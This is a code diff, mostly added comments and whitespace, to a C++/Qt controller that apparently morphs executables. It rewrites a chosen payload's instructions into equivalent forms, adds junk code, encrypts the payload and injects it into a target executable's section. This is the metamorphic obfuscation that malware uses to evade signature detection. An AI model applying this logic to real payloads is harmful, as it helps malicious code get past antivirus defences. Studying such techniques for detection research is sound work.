@@ -1495,9 +1494,8 @@ std::string Morph_Executable_Controller::generate_alternative_add_instructions(s
             }
             new_instruction = new_instruction + dec_instruction;
         }
-
-
     }
+	
     return new_instruction;
 }
 
@@ -1521,20 +1519,20 @@ void Morph_Executable_Controller::alternative_add_instruction(std::vector<Disass
             {
                 if(check_instruction_is_ptr(ops) == false) //if not a pointer
                 {
-
+					//use substring to get right and left operands
                     std::string right_op = ops.substr(ops.find_first_of(",")+1,ops.length());
                     std::string left_op = ops.substr(0,ops.find_first_of(","));
 
                     for(std::string reg : regs_array)
                     {
-
                         if(right_op.find(reg) != std::string::npos)
                         {
                             right_op_is_reg = true;
                             break;
                         }
                     }
-
+					
+					//modify only if the right operand is a register
                     unsigned int right_op_hex = dis_asm_vec[i].convert_string_to_hex(right_op);
                     std::string original_instruction = dis_asm_vec[i].get_full_instruction();
                     std::string new_instruction = generate_alternative_add_instructions(original_instruction,
@@ -1543,18 +1541,15 @@ void Morph_Executable_Controller::alternative_add_instruction(std::vector<Disass
                                                                                         right_op_is_reg,
                                                                                         right_op_hex);
 
-
                     //now reassigning back the new instruction
                     gen_new_machine_code(dis_asm_vec[i],new_instruction,machine_code_vec,machine_code_num_of_bytes);
-
                 }
             }
         }
     }
 }
 
-
-
+//alt xor clearing
 void Morph_Executable_Controller::alternative_xor_clear_instruction(std::vector<Disassembly> &dis_asm_vec,
                                                           std::vector<unsigned char> &machine_code_vec,
                                                           size_t &machine_code_num_of_bytes)
@@ -1572,7 +1567,7 @@ void Morph_Executable_Controller::alternative_xor_clear_instruction(std::vector<
         {
             if(dis_asm_vec[i].get_id() == xor_id)
             {
-
+				//substring of left and right ops
                 std::string ops = dis_asm_vec[i].get_ops();
                 std::string left_op = ops.substr(0,ops.find_first_of(","));
                 std::string right_op = ops.substr(ops.find_first_of(",")+1,ops.length());
@@ -1602,8 +1597,10 @@ void Morph_Executable_Controller::alternative_xor_clear_instruction(std::vector<
     }
 }
 
+//alt general xor instructions
 void Morph_Executable_Controller::alternative_xor_general_instruction(std::vector<Disassembly> &dis_asm_vec,
-                                                        std::vector<unsigned char> &machine_code_vec,
+                        
+						std::vector<unsigned char> &machine_code_vec,
                                                         size_t &machine_code_num_of_bytes)
 {
     int xor_id = 334;
@@ -1616,9 +1613,8 @@ void Morph_Executable_Controller::alternative_xor_general_instruction(std::vecto
         {
             if(dis_asm_vec.at(i).get_id() == xor_id )
             {
-
+				//substring of left and right ops
                 std::string ops = dis_asm_vec[i].get_ops();
-
                 std::string left_op = ops.substr(0,ops.find_first_of(","));
                 std::string right_op = ops.substr(ops.find_first_of(",")+1,ops.length());
 
@@ -1638,7 +1634,6 @@ void Morph_Executable_Controller::alternative_xor_general_instruction(std::vecto
                 //they cannot be the same (left op != right op)
                 if(right_op.find(left_op) == std::string::npos && right_op_is_reg == true)
                 {
-
                     int chance = (rand() % 100);
                     if(to_insert_or_not(chance) == true)
                     {
@@ -1680,7 +1675,7 @@ void Morph_Executable_Controller::alternative_xor_general_instruction(std::vecto
     }
 }
 
-
+//alr and instructions
 void Morph_Executable_Controller::alternative_and_instruction(std::vector<Disassembly> &dis_asm_vec,
                                                      std::vector<unsigned char> &machine_code_vec,
                                                      size_t &machine_code_num_of_bytes)
@@ -1695,9 +1690,7 @@ void Morph_Executable_Controller::alternative_and_instruction(std::vector<Disass
         {
             if(dis_asm_vec[i].get_id() == and_id)
             {
-
                 std::string ops = dis_asm_vec.at(i).get_ops();
-
                 std::string left_op = ops.substr(0,ops.find_first_of(","));
                 std::string right_op = ops.substr(ops.find_first_of(",")+1,ops.length());
 
@@ -1744,7 +1737,6 @@ void Morph_Executable_Controller::alternative_and_instruction(std::vector<Disass
                         new_instruction += "and " + left_op + ", " + extra_reg + ";";
                         new_instruction += "pop " + extra_reg + ";";
 
-
                         gen_new_machine_code(dis_asm_vec[i],new_instruction,machine_code_vec,machine_code_num_of_bytes);
                     }
                 }
@@ -1753,7 +1745,7 @@ void Morph_Executable_Controller::alternative_and_instruction(std::vector<Disass
     }
 }
 
-
+//alt push instructions
 void Morph_Executable_Controller::alternative_push_instruction(std::vector<Disassembly> &dis_asm_vec,
                                                                std::vector<unsigned char> &machine_code_vec,
                                                                size_t &machine_code_num_of_bytes)
@@ -1775,9 +1767,7 @@ void Morph_Executable_Controller::alternative_push_instruction(std::vector<Disas
         {
             if(dis_asm_vec[i].get_id() == push_id)
             {
-
                 std::string ops = dis_asm_vec[i].get_ops();
-
                 bool ops_is_reg = false;
 
                 for(std::string reg : regs_array)
@@ -1809,7 +1799,7 @@ void Morph_Executable_Controller::alternative_push_instruction(std::vector<Disas
     }
 }
 
-
+//alt pop instructions
 void Morph_Executable_Controller::alternative_pop_instruction(std::vector<Disassembly> &dis_asm_vec,
                                                               std::vector<unsigned char> &machine_code_vec,
                                                               size_t &machine_code_num_of_bytes)
@@ -1843,6 +1833,7 @@ void Morph_Executable_Controller::alternative_pop_instruction(std::vector<Disass
 }
 // =========================================== END OF ALT INSTRUCTIONS =============================
 
+//pop up a warning message box if exe error occurs
 void Morph_Executable_Controller::error_warning_message_box(QString morph_status)
 {
 
@@ -1887,6 +1878,7 @@ void Morph_Executable_Controller::error_warning_message_box(QString morph_status
                              "Failed to disassemble in capstone");
     }
 }
+
 
 QString Morph_Executable_Controller::morph_exe_no_encryption(QString exe_file_path)
 {
@@ -2699,8 +2691,7 @@ QString Morph_Executable_Controller::morph_exe_with_encryption_junk_alt_instruct
     //gets the index corresponding to the radio button
     int chosen_payload_index = get_payload_radio_button();
 
-
-
+	//get payload chosen
     switch(chosen_payload_index)
     {
         case 0:
@@ -2712,7 +2703,8 @@ QString Morph_Executable_Controller::morph_exe_with_encryption_junk_alt_instruct
         default:
             break;
     }
-
+	
+	//for disassembly
     std::vector<Disassembly> temp_dis_asm_vec;
     this->morph_status = machine_code_to_asm(this->payload_vec,temp_dis_asm_vec);
 
@@ -2723,7 +2715,6 @@ QString Morph_Executable_Controller::morph_exe_with_encryption_junk_alt_instruct
     }
 
     this->disassembly_log += concat_disassembly(temp_dis_asm_vec,this->morphed_exe_name + QString(" : ORIGINAL PAYLOAD"));
-
 
     //adding junk instructions
     std::vector<uint64_t> address_of_insertions_vec;
@@ -2768,7 +2759,8 @@ QString Morph_Executable_Controller::morph_exe_with_encryption_junk_alt_instruct
     alternative_pop_instruction(this->dis_asm_vec,
                                 this->machine_code_vec,
                                 this->machine_code_num_of_bytes);
-
+	
+	//put all the new alt instructions into the payload vector
     modify_payload_vec_with_alternative_instructions(this->payload_vec,this->dis_asm_vec);
 
     this->dis_asm_vec.clear();
@@ -2780,17 +2772,16 @@ QString Morph_Executable_Controller::morph_exe_with_encryption_junk_alt_instruct
         return this->morph_status;
     }
 
-    this->disassembly_log += concat_disassembly(this->dis_asm_vec,this->morphed_exe_name + QString(" : PAYLOAD AFTER MORPHING"));
+    this->disassembly_log += concat_disassembly(this->dis_asm_vec,this->morphed_exe_name + QString(" : PAYLOAD AFTER MORPHING"));//for disassembly
 
-
-    //print_dis_asm_vec(dis_asm_vec);
 
     //=========================================================================================
 
     //setting the full file path
     set_morphed_exe_file_path(exe_file_path);
 
-    this->payload_num_of_bytes = 0x400;
+    this->payload_num_of_bytes = 0x400;//cannot be too big if not affect file size
+	
     //calculate the file alignment factor to align the section
     calculate_file_alignment_factor(this->payload_num_of_bytes,this->file_alignment,this->file_alignment_factor);
 
@@ -3060,8 +3051,6 @@ QString Morph_Executable_Controller::morph_exe_with_encryption_junk_alt_instruct
     QDateTime end = QDateTime::currentDateTime();
     this->elapsed_time = start.msecsTo(end);
 
-
-
     return this->morph_status;
 }
 
@@ -3089,7 +3078,7 @@ void Morph_Executable_Controller::update_analysis_textbox(QString analysis_textb
                                                           qint64 elapsed_time,
                                                           QString morph_status)
 {
-    this->cur_wind->ui->tabWidget->setCurrentIndex(1);
+    this->cur_wind->ui->tabWidget->setCurrentIndex(1);//switch to analysis tab
 
         QString previous_text_from_analysis = analysis_textbox_status;
 
@@ -3117,6 +3106,7 @@ void Morph_Executable_Controller::update_analysis_textbox(QString analysis_textb
         set_analysis_textbox_status(format);
 }
 
+//for disassembly log
 QString Morph_Executable_Controller::concat_disassembly(std::vector<Disassembly> &dis_asm_vec, QString line_header)
 {
     const QString line = QString("====================================================================================================================");
@@ -3141,4 +3131,3 @@ QString Morph_Executable_Controller::concat_disassembly(std::vector<Disassembly>
 
     return QString(result.str().c_str());
 }
-
